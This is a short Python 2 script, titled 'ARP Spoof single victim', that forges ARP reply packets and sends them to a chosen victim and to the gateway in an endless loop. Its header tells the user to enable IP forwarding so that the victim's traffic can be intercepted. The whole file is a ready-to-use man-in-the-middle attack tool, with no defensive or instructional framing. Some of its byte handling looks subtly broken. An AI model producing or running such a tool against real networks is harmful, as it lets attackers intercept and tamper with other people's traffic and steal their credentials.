'''
Title: ARP Spoof single victim.

Description;
	Run as sudo.
	sudo nano /proc/sys/net/ipv4/ip_forward
	1 = forwarding
	0 = no forwarding
'''

import socket
import struct
import binascii
import uuid

#Retrive source mac address.
SourceMac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
#Replace : with \x.
hexMac = "\\x"+ SourceMac.replace(":","\\x")

#Source Interface.
sourceInterface = raw_input("Source interface: ")

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind((sourceInterface,socket.htons(0x0800)))

#Prints the source Mac Address.
print "Source Mac Address is ", hexMac
sor = hexMac #Local Mac Address.
victmac = raw_input("Victims Mac Address: ") #Victims Mac Address.
gatemac = raw_input("Gateway Mac Address: ") #Gateway Mac Address.

code = "\x08\x06" #Protocol type, (\x08\x06 is the ARP protocol)
eth1 = victmac+sor+code #For Victims
eth2 = gatemac+sor+code #For gateway

htype = "\x00\x01" #Denote the Ethernet frame.
protype = "\x08\x00" #Protocol type.
hsize = "\x06" #Hardware address size.
psize = "\x04" #Gives the IP Address length.
opcode = "\x00\x02" #Reply Packet.

gate_ip = raw_input("Gateway IP Address: ")
victim_ip = raw_input("Victim IP Address: ")
gip = socket.inet_aton (gate_ip) #Converts the IP Address to Hex.
vip = socket.inet_aton (victim_ip) #converts the IP Address to Hex.

arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip
arp_gateway = eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip

while 1:
	s.send(arp_victim)
	s.send(arp_gateway)
